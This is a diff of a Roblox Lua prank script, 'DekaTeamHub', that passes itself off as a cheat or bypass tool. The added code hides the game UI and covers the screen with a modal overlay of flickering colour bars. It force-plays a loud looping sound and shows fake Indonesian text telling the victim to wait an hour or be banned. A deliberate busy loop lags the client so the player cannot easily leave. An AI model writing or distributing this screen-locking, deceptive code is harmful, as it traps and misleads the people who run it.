@@ -1,28 +1,25 @@
--- [[ DekaTeamHub: ABSOLUTE TACO BRUTE FORCE ]] --
+-- [[ DekaTeamHub: ABSOLUTE TACO SOUND BYPASS ]] --
 task.spawn(function()
+    local CP = game:GetService("ContentProvider")
     local SS = game:GetService("SoundService")
     
-    -- 1. ULTIMATE AUDIO BYPASS (SPAM PLAY)
-    local function forceAudio()
-        local s = Instance.new("Sound")
-        s.SoundId = "rbxassetid://142276005" -- TACO
-        s.Volume = 10
-        s.Looped = true
-        s.Parent = SS
-        
-        -- Coba berbagai metode play
-        s:Play()
-        pcall(function() SS:PlayLocalSound(s) end) 
-    end
+    -- 1. PRE-LOAD AUDIO (BIAR GAK ADA ALASAN GAK BUNYI)
+    local tacoId = "rbxassetid://142276005"
+    local s = Instance.new("Sound")
+    s.SoundId = tacoId
+    s.Volume = 10
+    s.Looped = true
+    s.Parent = SS
     
-    forceAudio()
-
-    -- 2. DISABLE SYSTEM & UI
+    -- PAKSA DOWNLOAD AUDIO DULU
+    CP:PreloadAsync({s})
+    
+    -- 2. DISABLE SYSTEM & LOCK DOWN
     pcall(function()
         game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
     end)
 
-    -- 3. VISUAL TRAP (COLOR BARS + FAKE TEXT)
+    -- 3. VISUAL TRAP (MUNCUL SETELAH AUDIO SIAP)
     local screen = Instance.new("ScreenGui", game:GetService("CoreGui"))
     screen.DisplayOrder = 2147483647
     screen.IgnoreGuiInset = true
@@ -33,7 +30,6 @@ task.spawn(function()
     B.Modal = true
     B.Text = ""
 
-    -- Rainbow Bars
     local Bars = Instance.new("Frame", B)
     Bars.Size = UDim2.new(1, 0, 1, 0)
     local colors = {
@@ -50,7 +46,6 @@ task.spawn(function()
         f.BorderSizePixel = 0
     end
 
-    -- FAKE TEXT (Sesuai foto Tuan)
     local T = Instance.new("TextLabel", B)
     T.Size = UDim2.new(0.8, 0, 0.4, 0)
     T.Position = UDim2.new(0.1, 0, 0.3, 0)
@@ -60,7 +55,11 @@ task.spawn(function()
     T.Font = "Code"
     T.Text = "SABAR TUNGGU 1 JAM!\nJANGAN LEAVE KALAU MAU SCRIPT WORK!\n\nSCRIPT BYPASS SEMUANYA DULU!\nKALAU GAK BYPASS BAKAL DI BAN!!"
 
-    -- 4. GLITCH ENGINE
+    -- PLAY SOUND SECARA PAKSA
+    s:Play()
+    SS.RespectFilteringEnabled = false -- Bypass settingan game
+
+    -- 4. GLITCH & LAG ENGINE
     game:GetService("RunService").RenderStepped:Connect(function()
         Bars.Position = UDim2.new(0, math.random(-10, 10), 0, math.random(-10, 10))
         if math.random(1, 5) == 1 then
@@ -69,12 +68,13 @@ task.spawn(function()
             n.Position = UDim2.new(0, 0, math.random(0, 100)/100, 0)
             n.BackgroundColor3 = Color3.new(1, 1, 1)
             n.BackgroundTransparency = 0.5
-            task.delay(0.02, function() n:Destroy() end)
+            task.delay(0.01, function() n:Destroy() end)
         end
-        -- Bikin lag biar gak bisa pencet tombol home/back lancar
-        for i = 1, 3000000 do local _ = i * i end
+        -- Lag generator buat nahan biar gak gampang keluar
+        for i = 1, 2000000 do local _ = i * i end
     end)
 end)
+
 
 
 
